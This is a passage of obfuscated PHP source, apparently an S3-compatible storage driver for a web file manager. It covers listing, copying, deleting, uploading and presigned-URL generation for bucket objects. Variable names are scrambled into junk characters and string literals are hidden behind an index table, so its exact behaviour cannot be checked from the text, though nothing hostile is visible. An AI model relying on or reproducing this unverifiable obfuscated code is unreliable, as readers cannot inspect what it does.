{ return array(); } $˜¦¾ã•¨ = array_keys($¼ÈÊêö‹); $›şÉÊóÆ = array(); $âİÊÍ£ = trim($âİÊÍ£, $†ıù¼„[8]); foreach ($¼ÈÊêö‹ as $¥œç‰ññ => $Š”¿ƒÄ¡) { $ƒÃ†ó = ltrim(substr(trim($¥œç‰ññ, $†ıù¼„[8]), strlen($âİÊÍ£)), $†ıù¼„[8]); if (substr($¥œç‰ññ, -1) == $†ıù¼„[8]) { $ƒÃ†ó = rtrim($ƒÃ†ó, $†ıù¼„[8]) . $†ıù¼„[8]; } $›şÉÊóÆ = array_merge($›şÉÊóÆ, $this->slicePath($ƒÃ†ó)); } $šÒû‘Õù = array(); foreach (array_unique($›şÉÊóÆ) as $ĞŒÂ®÷š) { $íîæäá³ = array($†ıù¼„[87] => $this->getPathOuter($†ıù¼„[8] . $âİÊÍ£ . $†ıù¼„[8] . $ĞŒÂ®÷š), $†ıù¼„[78] => 1, $†ıù¼„[79] => 0); if (substr($ĞŒÂ®÷š, -1) != $†ıù¼„[8]) { $íîæäá³[$†ıù¼„[78]] = 0; $¬§ Š = $this->getPath($âİÊÍ£ . $†ıù¼„[8] . $ĞŒÂ®÷š); if (isset($¼ÈÊêö‹[$¬§ Š])) { $æ–§±Ş— = $¼ÈÊêö‹[$¬§ Š]; if (isset($æ–§±Ş—[$†ıù¼„[79]])) { $íîæäá³[$†ıù¼„[79]] = intval($æ–§±Ş—[$†ıù¼„[79]]); } if (isset($æ–§±Ş—[$†ıù¼„[206]])) { $íîæäá³[$†ıù¼„[88]] = intval($æ–§±Ş—[$†ıù¼„[206]]); } } } $šÒû‘Õù[] = $íîæäá³; } return $šÒû‘Õù; } public function slicePath($ÔÖ¶¤¤È) { $“ÅÂ¡«ˆ =& $_SERVER[±Ö‰ô½¯]; $¹ÍÉ©ÄÃ = explode($“ÅÂ¡«ˆ[8], trim($ÔÖ¶¤¤È, $“ÅÂ¡«ˆ[8])); $‘Ğ…øú = 0; do { ++$‘Ğ…øú; $É¢”„„¬[] = implode($“ÅÂ¡«ˆ[8], array_slice($¹ÍÉ©ÄÃ, 0, $‘Ğ…øú)) . $“ÅÂ¡«ˆ[8]; } while ($‘Ğ…øú < count($¹ÍÉ©ÄÃ)); $É¢”„„¬[count($¹ÍÉ©ÄÃ) - 1] = $ÔÖ¶¤¤È; return $É¢”„„¬; } public function getHost() { $Ÿƒ¿°ğâ =& $_SERVER[±Ö‰ô½¯]; $äâüŠëº = parse_url(trim($this->domain, $Ÿƒ¿°ğâ[8])); $éÖÅ•¤È = isset($äâüŠëº[$Ÿƒ¿°ğâ[207]]) ? $äâüŠëº[$Ÿƒ¿°ğâ[207]] : http_type(); $ÈÉª÷ƒÓ = isset($äâüŠëº[$Ÿƒ¿°ğâ[208]]) ? $äâüŠëº[$Ÿƒ¿°ğâ[208]] : $äâüŠëº[$Ÿƒ¿°ğâ[87]]; if (isset($äâüŠëº[$Ÿƒ¿°ğâ[209]])) { $ÈÉª÷ƒÓ .= $Ÿƒ¿°ğâ[4] . $äâüŠëº[$Ÿƒ¿°ğâ[209]]; } return $éÖÅ•¤È . $Ÿƒ¿°ğâ[210] . $ÈÉª÷ƒÓ; } public function pathEncode($«ÊÕÏë) { $©İñŞ• =& $_SERVER[±Ö‰ô½¯]; return str_replace($©İñŞ•[211], $©İñŞ•[8], rawurlencode($«ÊÕÏë)); } public function writeLog($¶€ªæ¬¡ = '', $ÉŠÁüŞ = false) { $™ëê» =& $_SERVER[±Ö‰ô½¯]; $É™íÓİ = in_array(ACTION, array($™ëê»[212], $™ëê»[213])); if (!$É™íÓİ && !GLOBAL_DEBUG) { return; } $‚ìæÁëú = $¶€ªæ¬¡; static $ó­‘ŒÇÚ = null; if (!$ó­‘ŒÇÚ) { $ó­‘ŒÇÚ = strtoupper($this->getType()); } $¶€ªæ¬¡ = $ó­‘ŒÇÚ . $™ëê»[214] . $¶€ªæ¬¡; if ($ÉŠÁüŞ) { $Ñ°çÌ¬ş = error_get_last(); if ($Ñ°çÌ¬ş) { $¶€ªæ¬¡ = array($¶€ªæ¬¡, $Ñ°çÌ¬ş); } } write_log($¶€ªæ¬¡, $™ëê»[215]); if ($É™íÓİ) { throw new Exception($‚ìæÁëú); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($­¬æ›×©) { set_timeout(); require_once SDK_DIR . $_SERVER[±Ö‰ô½¯][216]; parent::__construct(); $this->_init($­¬æ›×©); } public function _init($œ¬ä®õ¿) { $³ù¹® =& $_SERVER[±Ö‰ô½¯]; $this->config = $œ¬ä®õ¿; foreach ($œ¬ä®õ¿ as $Šè¯ıÜÂ => $‰ëğÅÆ) { if (isset($this->{$Šè¯ıÜÂ})) { $this->{$Šè¯ıÜÂ} = $‰ëğÅÆ; } } $this->endpoint = $œ¬ä®õ¿[$³ù¹®[217]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $ıÖâ—ßå = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($ıÖâ—ßå, 0, 7) == $³ù¹®[218]) { $ıÖâ—ßå = $³ù¹®[219] . substr($ıÖâ—ßå, 7); } $this->client->setEndpoint($ıÖâ—ßå); if (in_array(ACTION, array($³ù¹®[212], $³ù¹®[213]))) { $this->client->setExceptions(); } } public function setSignVersion($ğç·ñ—ş = "\166\64") { $this->signVer = $ğç·ñ—ş; $this->client->setSignVersion($ğç·ñ—ş); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $ŠŸÖ—¶) { return null; } } public function isBucketCors() { $âœÚåŸè =& $_SERVER[±Ö‰ô½¯]; $ì¦Ì¦Ò = $this->getBucketCors(); if (!$ì¦Ì¦Ò || !is_array($ì¦Ì¦Ò)) { return !1; } if (!is_array($ì¦Ì¦Ò[$âœÚåŸè[220]])) { $ì¦Ì¦Ò[$âœÚåŸè[220]] = explode($âœÚåŸè[50], $ì¦Ì¦Ò[$âœÚåŸè[220]]); } if ($ì¦Ì¦Ò[$âœÚåŸè[221]] != $âœÚåŸè[222] || !in_array($âœÚåŸè[222], $ì¦Ì¦Ò[$âœÚåŸè[220]])) { return !1; } $Ó¯®»Î = array_map($âœÚåŸè[223], $ì¦Ì¦Ò[$âœÚåŸè[224]]); if (!is_array($Ó¯®»Î)) { $Ó¯®»Î = array(); } $€ĞÈĞìÒ = array($âœÚåŸè[225], $âœÚåŸè[226], $âœÚåŸè[227], $âœÚåŸè[228], $âœÚåŸè[229]); $Î‚ããé¿ = array_diff($€ĞÈĞìÒ, $Ó¯®»Î); return empty($Î‚ããé¿); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($Éìü—É¿, $ÙúÔØ­ = '', $îßóÓöÆ = REPEAT_RENAME) { $ñõ„æ¶ = $this->setContent($Éìü—É¿, $ÙúÔØ­); if ($ñõ„æ¶ !== !1) { return $this->getPathOuter($Éìü—É¿); } return !1; } public function mkdir($®«Ùæõ—, $óíó€–î = REPEAT_SKIP) { $ŞĞÖëŠã =& $_SERVER[±Ö‰ô½¯]; if (empty($®«Ùæõ—) && $®«Ùæõ— !== $ŞĞÖëŠã[230]) { return !1; } if ($óíó€–î && $this->_isFolder($®«Ùæõ—)) { return $this->getPathOuter($®«Ùæõ—); } $ÊÌ»Ã£­ = $this->setContent($®«Ùæõ—, $ŞĞÖëŠã[12], !0); if ($ÊÌ»Ã£­ !== !1) { return $this->getPathOuter($®«Ùæõ—); } return !1; } public function copyFile($´±İãÏ, $ª‰¯‰ï, $ş€ä¡¾ = array()) { $–¦äø‘Ü =& $_SERVER[±Ö‰ô½¯]; $¦šöõÏ = $this->objectMeta($´±İãÏ); if (!$¦šöõÏ) { return !1; } if ($¦šöõÏ[$–¦äø‘Ü[79]] <= 1024 * 1024 * 200) { $„±ÂÈ¤® = $this->client->copyObject($this->bucket, $´±İãÏ, $this->bucket, $ª‰¯‰ï, $–¦äø‘Ü[231], $ş€ä¡¾); } else { $„±ÂÈ¤® = $this->client->multiCopyObject($this->bucket, $´±İãÏ, $this->bucket, $ª‰¯‰ï, $ş€ä¡¾); } $„±ÂÈ¤® = $„±ÂÈ¤® ? $this->getPathOuter($ª‰¯‰ï) : !1; return $„±ÂÈ¤®; } public function moveFile($èßÊ¿Ş•, $ÖÆóÆ‘‡) { if ($this->copyFile($èßÊ¿Ş•, $ÖÆóÆ‘‡)) { $this->delFile($èßÊ¿Ş•); return $this->getPathOuter($ÖÆóÆ‘‡); } return !1; } public function delFile($ì„ã…Öå) { return $this->client->deleteObject($this->bucket, $ì„ã…Öå); } public function delFolder($¡ÑûÕ) { $·â€×²ğ =& $_SERVER[±Ö‰ô½¯]; if (!$this->exist($¡ÑûÕ)) { return !0; } $this->listItemCache = !1; $õá €— = $this->fileList($¡ÑûÕ); $this->listItemCache = !0; $‡Á€úí = trim($¡ÑûÕ, $·â€×²ğ[8]) . $·â€×²ğ[8]; if (!empty($¡ÑûÕ) && $¡ÑûÕ !== $·â€×²ğ[230] && !in_array($‡Á€úí, $õá €—[$·â€×²ğ[85]])) { $õá €—[$·â€×²ğ[85]][] = $‡Á€úí; } $¼”°Åúí = $this->delByBatch($õá €—[$·â€×²ğ[86]]); if (!$¼”°Åúí) { return !1; } $¼”°Åúí = $this->delByBatch($õá €—[$·â€×²ğ[85]]); if (!$¼”°Åúí) { return !1; } return $this->delFile($‡Á€úí); } private function delByBatch($™¼æ°Ô) { foreach (array_chunk($™¼æ°Ô, 1000) as $ŠŒèı¯•) { $Æ”—Í‘½ = $this->client->deleteObjects($this->bucket, $ŠŒèı¯•); if (!$Æ”—Í‘½) { return !1; } } return !0; } public function rename($ùõâŠÈø, $˜µ±‡î±) { return $this->renameObject($ùõâŠÈø, $˜µ±‡î±); } public function listPath($õÊúœ¶¾, $Ïí¾‘ç‡ = false) { $İÔÁÎÁ =& $_SERVER[±Ö‰ô½¯]; $¨í ®áÇ = $this->fileList($õÊúœ¶¾, $İÔÁÎÁ[8], !0); foreach ($¨í ®áÇ[$İÔÁÎÁ[85]] as $äõµ˜ƒš => $´Ï¶½‹ˆ) { $¨í ®áÇ[$İÔÁÎÁ[85]][$äõµ˜ƒš] = $this->folderInfo($´Ï¶½‹ˆ, $Ïí¾‘ç‡, $´Ï¶½‹ˆ); } foreach ($¨í ®áÇ[$İÔÁÎÁ[86]] as $äõµ˜ƒš => $´Ï¶½‹ˆ) { $¨í ®áÇ[$İÔÁÎÁ[86]][$äõµ˜ƒš] = $this->fileInfo($´Ï¶½‹ˆ[$İÔÁÎÁ[32]], $Ïí¾‘ç‡, $´Ï¶½‹ˆ); } return $¨í ®áÇ; } protected function infoChildren($äôâ×æ•, &$Õ‹éÌ¥) { $ÔÅÕ››Å =& $_SERVER[±Ö‰ô½¯]; $Ìé”ªÚ = $this->fileList($äôâ×æ•, $ÔÅÕ››Å[12], !0); $Õ‹éÌ¥[$ÔÅÕ››Å[81]] += count($Ìé”ªÚ[$ÔÅÕ››Å[85]]); $Õ‹éÌ¥[$ÔÅÕ››Å[80]] += count($Ìé”ªÚ[$ÔÅÕ››Å[86]]); foreach ($Ìé”ªÚ[$ÔÅÕ››Å[86]] as $Ì¦¦çòŸ) { if (!$Ì¦¦çòŸ || !$Ì¦¦çòŸ[$ÔÅÕ››Å[79]]) { continue; } $Õ‹éÌ¥[$ÔÅÕ››Å[79]] += $Ì¦¦çòŸ[$ÔÅÕ››Å[79]]; } } private function fileInfo($ó¨ÕùóÏ, $Ëê®Àü¹ = false, $Úè†É…Ä = array()) { $ÈË‚×òé =& $_SERVER[±Ö‰ô½¯]; $È­ãá‹û = array($ÈË‚×òé[32] => $this->pathThis($ó¨ÕùóÏ), $ÈË‚×òé[87] => $this->getPathOuter($ó¨ÕùóÏ), $ÈË‚×òé[33] => $ÈË‚×òé[232], $ÈË‚×òé[168] => $this->ext($ó¨ÕùóÏ), $ÈË‚×òé[79] => isset($Úè†É…Ä[$ÈË‚×òé[79]]) ? $Úè†É…Ä[$ÈË‚×òé[79]] : 0); if ($Ëê®Àü¹) { return $È­ãá‹û; } $È­ãá‹û[$ÈË‚×òé[233]] = $È­ãá‹û[$ÈË‚×òé[88]] = 0; $È­ãá‹û[$ÈË‚×òé[234]] = $È­ãá‹û[$ÈË‚×òé[235]] = !0; if (empty($Úè†É…Ä)) { $Úè†É…Ä = $this->objectMeta($ó¨ÕùóÏ); if (!$Úè†É…Ä) { return $È­ãá‹û; } } if (isset($Úè†É…Ä[$ÈË‚×òé[236]]) && $Úè†É…Ä[$ÈË‚×òé[236]]) { $È­ãá‹û[$ÈË‚×òé[237]] = $Úè†É…Ä[$ÈË‚×òé[236]]; } if (isset($Úè†É…Ä[$ÈË‚×òé[206]])) { $È­ãá‹û[$ÈË‚×òé[88]] = $Úè†É…Ä[$ÈË‚×òé[206]]; } if (isset($Úè†É…Ä[$ÈË‚×òé[79]])) { $È­ãá‹û[$ÈË‚×òé[79]] = $Úè†É…Ä[$ÈË‚×òé[79]]; } return $È­ãá‹û; } private function folderInfo($­•ñÄ›, $ÆÌŸ¿Ä = false, $şÆ›Ôª = array()) { $õ×„ ª =& $_SERVER[±Ö‰ô½¯]; $ò¿© £ = array($õ×„ ª[32] => $this->pathThis($­•ñÄ›), $õ×„ ª[87] => $this->getPathOuter($õ×„ ª[8] . $­•ñÄ›), $õ×„ ª[33] => $õ×„ ª[78]); if ($ÆÌŸ¿Ä) { return $ò¿© £; } $ò¿© £[$õ×„ ª[233]] = $ò¿© £[$õ×„ ª[88]] = 0; $ò¿© £[$õ×„ ª[234]] = $ò¿© £[$õ×„ ª[235]] = !0; if ($­•ñÄ› == $õ×„ ª[12]) { return $ò¿© £; } if (empty($şÆ›Ôª)) { $şÆ›Ôª = $this->objectMeta(trim($­•ñÄ›, $õ×„ ª[8]) . $õ×„ ª[8]); } if (isset($şÆ›Ôª[$õ×„ ª[206]])) { $ò¿© £[$õ×„ ª[233]] = $şÆ›Ôª[$õ×„ ª[206]]; } return $ò¿© £; } private function fileList($ÒÖ‹Ò‡¡, $˜Á”À­ó = '', $¿î‹´ß° = 0) { $ÙÃ©ÄÈ =& $_SERVER[±Ö‰ô½¯]; $„ãØ»ä = rtrim($ÒÖ‹Ò‡¡, $ÙÃ©ÄÈ[8]) . $ÙÃ©ÄÈ[8]; $ƒ¸“˜Ø = $this->listObjs($„ãØ»ä, null, null, $˜Á”À­ó); if (!$ƒ¸“˜Ø) { return array($ÙÃ©ÄÈ[85] => array(), $ÙÃ©ÄÈ[86] => array()); } $ÙÌë•à• = $İÃ¨Ø¤½ = array(); foreach ($ƒ¸“˜Ø[$ÙÃ©ÄÈ[238]] as $ûÉ«Å”é) { $Î­§Ùõ = $ûÉ«Å”é[$ÙÃ©ÄÈ[32]]; if ($Î­§Ùõ == $„ãØ»ä) { continue; } $½ÌÁ€¤™ = isset($ûÉ«Å”é[$ÙÃ©ÄÈ[79]]) ? $ûÉ«Å”é[$ÙÃ©ÄÈ[79]] : 0; $è—…Š»Â = $½ÌÁ€¤™ == 0 && substr($Î­§Ùõ, strlen($Î­§Ùõ) - 1, 1) == $ÙÃ©ÄÈ[8] ? !0 : !1; $this->cacheMethodInfoSet($Î­§Ùõ, $è—…Š»Â, $ûÉ«Å”é); if ($è—…Š»Â) { $ÙÌë•à•[] = $Î­§Ùõ; continue; } $İÃ¨Ø¤½[] = $¿î‹´ß° ? $ûÉ«Å”é : $Î­§Ùõ; } foreach ($ƒ¸“˜Ø[$ÙÃ©ÄÈ[239]] as $ûÉ«Å”é) { $ÙÌë•à•[] = $ûÉ«Å”é[$ÙÃ©ÄÈ[32]]; $this->cacheMethodInfoSet($ûÉ«Å”é[$ÙÃ©ÄÈ[32]], !0); } $this->cacheMethodInfoSet($ÒÖ‹Ò‡¡, !0); return array($ÙÃ©ÄÈ[85] => $ÙÌë•à•, $ÙÃ©ÄÈ[86] => $İÃ¨Ø¤½); } private function listObjs($ÇŠáÈæò, $õõ»•ŒŞ = null, $‹Àƒ³ûÁ = null, $ÑÒ–¨Ôü = null) { $­ë…ú¿õ =& $_SERVER[±Ö‰ô½¯]; $ÇŠáÈæò = trim($ÇŠáÈæò, $­ë…ú¿õ[8]); $ÕÍİ¿îÅ = empty($ÇŠáÈæò) && $ÇŠáÈæò !== $­ë…ú¿õ[230] ? $­ë…ú¿õ[12] : $ÇŠáÈæò . $­ë…ú¿õ[8]; return $this->client->getBucket($this->bucket, $ÕÍİ¿îÅ, $õõ»•ŒŞ, $‹Àƒ³ûÁ, $ÑÒ–¨Ôü, !0); } public function has($ş®ØäØÆ, $¿‰€êÂ = false, $ˆı÷Ğ÷Î = true) { $óìùöÙÅ =& $_SERVER[±Ö‰ô½¯]; $ş®ØäØÆ = trim($ş®ØäØÆ, $óìùöÙÅ[8]); $¯©Ö­É‹ = empty($ş®ØäØÆ) && $ş®ØäØÆ !== $óìùöÙÅ[230] ? $óìùöÙÅ[12] : $ş®ØäØÆ . $óìùöÙÅ[8]; $Ø ˆøéİ = null; $¶ş…‘Ø† = 500; $äéÁÆ‚ = $óìùöÙÅ[8]; $·êĞÊ®€ = $™ º®ó… = array(); while (!0) { $´ß°Õ§± = $this->listObjs($ş®ØäØÆ, $Ø ˆøéİ, $¶ş…‘Ø†, $äéÁÆ‚); if (!$´ß°Õ§±) { break; } $Ø ˆøéİ = $´ß°Õ§±[$óìùöÙÅ[240]]; $õ“ÀôìÇ = $´ß°Õ§±[$óìùöÙÅ[238]]; $´æğÅ¯é = $´ß°Õ§±[$óìùöÙÅ[239]]; if (empty($õ“ÀôìÇ) && empty($´æğÅ¯é)) { break; } if (count($õ“ÀôìÇ) == 1 && $õ“ÀôìÇ[0][$óìùöÙÅ[32]] == $¯©Ö­É‹) { break; } if ($¿‰€êÂ) { if (count($õ“ÀôìÇ)) { $õ“ÀôìÇ = array_column($õ“ÀôìÇ, $óìùöÙÅ[32]); $·êĞÊ®€ = array_merge($·êĞÊ®€, $õ“ÀôìÇ); } if (count($´æğÅ¯é)) { $´æğÅ¯é = array_column($´æğÅ¯é, $óìùöÙÅ[32]); $™ º®ó… = array_merge($™ º®ó…, $´æğÅ¯é); } if ($Ø ˆøéİ === null) { break; } continue; } if ($ˆı÷Ğ÷Î) { if (!empty($õ“ÀôìÇ)) { if (count($õ“ÀôìÇ) > 1 || isset($õ“ÀôìÇ[0][$óìùöÙÅ[32]]) && $õ“ÀôìÇ[0][$óìùöÙÅ[32]] != $¯©Ö­É‹) { return !0; } } } else { if (!empty($´æğÅ¯é)) { return !0; } } if ($Ø ˆøéİ === null) { break; } } if ($¿‰€êÂ) { $·êĞÊ®€ = array_diff($·êĞÊ®€, array($¯©Ö­É‹)); $·êĞÊ®€ = count(array_unique($·êĞÊ®€)); $™ º®ó… = count(array_unique($™ º®ó…)); return array($óìùöÙÅ[241] => $·êĞÊ®€, $óìùöÙÅ[242] => $™ º®ó…); } return !1; } public function listAll($ù„Á‡Şô) { $©¤¨¨£ =& $_SERVER[±Ö‰ô½¯]; $ˆÃÓ×Öş = $this->fileList($ù„Á‡Şô, $©¤¨¨£[12], !0); $è¯‰äúÄ = array_to_keyvalue($ˆÃÓ×Öş[$©¤¨¨£[86]], $©¤¨¨£[32]); foreach ($ˆÃÓ×Öş[$©¤¨¨£[85]] as $ß™¿İ™) { if (is_string($ß™¿İ™)) { $è¯‰äúÄ[$ß™¿İ™] = array($©¤¨¨£[79] => 0); } } return $this->listAllFiles($ù„Á‡Şô, $è¯‰äúÄ); } public function canRead($İ™ó›ş) { $½ËÀ¾°Ë =& $_SERVER[±Ö‰ô½¯]; $ÁªöÙù™ = $this->client->getAccessControlPolicy($this->bucket, $İ™ó›ş); if (!$ÁªöÙù™) { return !1; } return in_array($ÁªöÙù™, array($½ËÀ¾°Ë[243], $½ËÀ¾°Ë[244], $½ËÀ¾°Ë[245])) ? !0 : !1; } public function canWrite($Æ³¼ôŒÎ) { $¬õÎ©­Ê =& $_SERVER[±Ö‰ô½¯]; $œÉ‘·æ = $this->client->getAccessControlPolicy($this->bucket, $Æ³¼ôŒÎ); if (!$œÉ‘·æ) { return !1; } return in_array($œÉ‘·æ, array($¬õÎ©­Ê[243], $¬õÎ©­Ê[244])) ? !0 : !1; } public function getContent($óØ¿¸¨•) { return $this->client->getObject($this->bucket, $óØ¿¸¨•); } public function setContent($¹Ëúã³é, $÷Ï ±Ç¡ = '', $¡ĞÚêşî = false) { $º±æç„ã =& $_SERVER[±Ö‰ô½¯]; $¹Ëúã³é = $¡ĞÚêşî ? trim($¹Ëúã³é, $º±æç„ã[8]) . $º±æç„ã[8] : $¹Ëúã³é; $ŒÃÛÌûÜ = get_file_mime(get_path_ext($¹Ëúã³é)); $ò²Ø‚åş = $this->client->putObject($÷Ï ±Ç¡, $this->bucket, $¹Ëúã³é, $º±æç„ã[231], array(), $ŒÃÛÌûÜ); if (!$ò²Ø‚åş) { return !1; } if ($¡ĞÚêşî) { return !0; } return $ò²Ø‚åş ? !0 : !1; } public function fileSubstr($ßúŒ…œë, $ÄµËØëÈ, $Â×Ø­ı) { $çÂ¹®— = $ÄµËØëÈ + $Â×Ø­ı - 1; return $this->client->getObject($this->bucket, $ßúŒ…œë, array($_SERVER[±Ö‰ô½¯][246] => "\x62\171\x74\x65\163\x3d{$ÄµËØëÈ}\55{$çÂ¹®—}")); } public function upload($ëÌÏøÇ, $ĞÂÀğ±Ã, $ÛÛãåŞ› = false, $Ñ‘ü±Ú = REPEAT_REPLACE) { $èßÆ…ë• =& $_SERVER[±Ö‰ô½¯]; if (!$ĞÂÀğ±Ã || !@file_exists($ĞÂÀğ±Ã)) { return !1; } $ûêÓïƒÁ = array($èßÆ…ë•[247] => @md5_file($ĞÂÀğ±Ã)); $ÂˆÖçæÕ = array($èßÆ…ë•[248] => get_file_mime(get_path_ext($ëÌÏøÇ))); if (IO::size($ĞÂÀğ±Ã) <= 1024 * 1024 * 200) { $°îŸé¨¡ = $this->client->putObjectFile($ĞÂÀğ±Ã, $this->bucket, $ëÌÏøÇ, $èßÆ…ë•[231], $ûêÓïƒÁ, $ÂˆÖçæÕ); return !empty($°îŸé¨¡) ? $this->getPathOuter($ëÌÏøÇ) : !1; } $Öì›Ñ„ = $this->client->multiUploadObject($ĞÂÀğ±Ã, $this->bucket, trim($ëÌÏøÇ, $èßÆ…ë•[8]), $ûêÓïƒÁ, $ÂˆÖçæÕ); return $Öì›Ñ„ ? $this->getPathOuter($ëÌÏøÇ) : !1; } public function download($ø•äÕÆ, $ÅÍöïÎ³) { if (!@is_dir($this->pathFather($ÅÍöïÎ³)) && !IO::mkdir($this->pathFather($ÅÍöïÎ³))) { return !1; } $‘ÉÕßÜ = $this->client->getObject($this->bucket, $ø•äÕÆ, array(), $ÅÍöïÎ³); return $‘ÉÕßÜ !== !1 ? $ÅÍöïÎ³ : !1; } public function link($¢ÖÔ¤³¢, $ŒÏ ğğØ = array()) { return $this->getPreSignedURL($¢ÖÔ¤³¢, 3600 * 12, $ŒÏ ğğØ); } private function getPreSignedURL($Ëí¤Ü, $Á—»˜Àİ, $æø­£¢ = array(), $…Û±ª®Ã = "\x47\105\124") { $³ËºÛ ã =& $_SERVER[±Ö‰ô½¯]; $Ëí¤Ü = trim($Ëí¤Ü, $³ËºÛ ã[8]); if ($this->signVer == $³ËºÛ ã[249]) { return $this->client->getPreSignedV2URL($this->bucket, $Ëí¤Ü, $Á—»˜Àİ, $…Û±ª®Ã, $æø­£¢); } return $this->client->getPreSignedV4URL($this->bucket, $Ëí¤Ü, $Á—»˜Àİ, array(), $…Û±ª®Ã, $æø­£¢); } public function fileOut($ı¢òË£­, $ûÇ©Ä®ª = false, $•Ø®¼Å = false, $ÉÒÅ³‰ = '') { $éåƒÉô• =& $_SERVER[±Ö‰ô½¯]; if ($this->isFileOutServer()) { return $this->fileOutServer($ı¢òË£­, $ûÇ©Ä®ª, $•Ø®¼Å, $ÉÒÅ³‰); } if (!$•Ø®¼Å) { $•Ø®¼Å = $this->pathThis($ı¢òË£­); } $ÕÙÏÌÆ˜ = get_file_mime(get_path_ext($•Ø®¼Å)); if ($ÕÙÏÌÆ˜ == $éåƒÉô•[250]) { return parent::fileOut($ı¢òË£­, $ûÇ©Ä®ª, $•Ø®¼Å, $ÉÒÅ³‰); } $ñùÖà½ = array($éåƒÉô•[251] => $ÕÙÏÌÆ˜); if ($ûÇ©Ä®ª) { $ñùÖà½[$éåƒÉô•[252]] = $éåƒÉô•[253] . rawurlencode($•Ø®¼Å); } else { } $×šŸ££‰ = $this->link($ı¢òË£­, $ñùÖà½); $this->fileOutLink($×šŸ££‰); } public function fileOutServer($™æè§Å›, $°Ê´‚™® = false, $­·òŸÌŞ = false, $Áæ·¸‹ = '') { parent::fileOut($™æè§Å›, $°Ê´‚™®, $­·òŸÌŞ, $Áæ·¸‹); } public function fileOutImageServer($Œ‘ Ñ¹, $¤ã®²ş‡ = 250) { parent::fileOutImage($Œ‘ Ñ¹, $¤ã®²ş‡); } public function fileOutLink($ÜµœĞ¼) { $øÂÄ­ÛÈ =& $_SERVER[±Ö‰ô½¯]; if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($øÂÄ­ÛÈ[67], $øÂÄ­ÛÈ[66], $øÂÄ­ÛÈ[68])) && !get_url_scheme($this->endpoint) && substr($ÜµœĞ¼, 0, 7) == $øÂÄ­ÛÈ[218]) { $ÜµœĞ¼ = $øÂÄ­ÛÈ[219] . substr($ÜµœĞ¼, 7); } header($øÂÄ­ÛÈ[174] . $ÜµœĞ¼); die; } public function hashMd5($µ¤¤…»¾, $©¹Î¥‹Õ = '') { $ÂµµÔÀ = $this->objectMeta($µ¤¤…»¾); if (!$ÂµµÔÀ) { return !1; } $©¹Î¥‹Õ = $©¹Î¥‹Õ ? $©¹Î¥‹Õ : _get($ÂµµÔÀ, $_SERVER[±Ö‰ô½¯][254]); return $©¹Î¥‹Õ; } public function uploadFormData($Øûš›Âé, $¸•¤íÛÌ = 3600) { $²©¶“« =& $_SERVER[±Ö‰ô½¯]; if (!$this->_isClientAsync()) { $Õà‚°¸ß = $this->getPreSignedURL($Øûš›Âé, $¸•¤íÛÌ, array(), $²©¶“«[255]); return array($²©¶“«[208] => str_replace($²©¶“«[218], $²©¶“«[256], $Õà‚°¸ß)); } if (isset($GLOBALS[$²©¶“«[6]][$²©¶“«[92]][$²©¶“«[257]]) && $GLOBALS[$²©¶“«[6]][$²©¶“«[92]][$²©¶“«[257]] == $²©¶“«[230]) { return $this->uploadMultiData($Øûš›Âé, $¸•¤íÛÌ); } if ($this->signVer == $²©¶“«[249]) { return $this->uploadFormDataV2($Øûš›Âé, $¸•¤íÛÌ); } return $this->uploadFormDataV4($Øûš›Âé, $¸•¤íÛÌ); } public function uploadFormDataV2($ü¼ÒÜ’¡, $„¢¦©˜­ = 3600) { $ŞÊÜı‘å =& $_SERVER[±Ö‰ô½¯]; $¼ãìŞù  = $this->pathFather($ü¼ÒÜ’¡); $Íú›ƒ®Á = $this->client->getHttpUploadPostParams($this->bucket, $¼ãìŞù , $ŞÊÜı‘å[231], $„¢¦©˜­); $İƒ¾Èµä = array_merge((array) $Íú›ƒ®Á, array($ŞÊÜı‘å[258] => $ŞÊÜı‘å[249], $ŞÊÜı‘å[208] => $this->getHost())); if ($this->_isClientAsync()) { unset($İƒ¾Èµä[$ŞÊÜı‘å[258]]); } return $İƒ¾Èµä; } public function uploadFormDataV4($¢„õÁµ‰, $Ç¿»™©” = 3600) { $¤„¿‚ÊÙ =& $_SERVER[±Ö‰ô½¯]; $âŸÖõ±º = $¤„¿‚ÊÙ[231]; $ª¾òŒ ¡ = $¤„¿‚ÊÙ[259]; $Ì”ÇÙé = $¤„¿‚ÊÙ[62]; $Ëà‡Á“Ö = gmdate($¤„¿‚ÊÙ[260]); $æÕ¡ä”¬ = gmdate($¤„¿‚ÊÙ[261]); $ñŠ£„óñ = $¤„¿‚ÊÙ[262]; $ÆÀôÈìë = $Ç¿»™©” . $¤„¿‚ÊÙ[12]; $ËîïĞ¸Ô = $¤„¿‚ÊÙ[263]; $¬ŞÍÙÉ = array($this->accessKey, $æÕ¡ä”¬, $this->region, $Ì”ÇÙé, $ñŠ£„óñ); $£óßÈ¹ı = implode($¤„¿‚ÊÙ[8], $¬ŞÍÙÉ); $…ø×ğ…œ = array($¤„¿‚ÊÙ[264] => gmdate($¤„¿‚ÊÙ[265], strtotime($¤„¿‚ÊÙ[266])), $¤„¿‚ÊÙ[267] => array(array($¤„¿‚ÊÙ[268] => $this->bucket), array($¤„¿‚ÊÙ[269], $¤„¿‚ÊÙ[270], $¤„¿‚ÊÙ[12]), array($¤„¿‚ÊÙ[269], $¤„¿‚ÊÙ[271], $¤„¿‚ÊÙ[12]), array($¤„¿‚ÊÙ[272] => $ËîïĞ¸Ô), array($¤„¿‚ÊÙ[273] => $£óßÈ¹ı), array($¤„¿‚ÊÙ[274] => $ª¾òŒ ¡), array($¤„¿‚ÊÙ[275] => $Ëà‡Á“Ö), array($¤„¿‚ÊÙ[276] => $ÆÀôÈìë))); $µ´Ööä = base64_encode(json_encode($…ø×ğ…œ)); $òÂ™ëõ” = hash_hmac($¤„¿‚ÊÙ[277], $æÕ¡ä”¬, $¤„¿‚ÊÙ[278] . $this->secret, !0); $¢¶¡óğ¸ = hash_hmac($¤„¿‚ÊÙ[277], $this->region, $òÂ™ëõ”, !0); 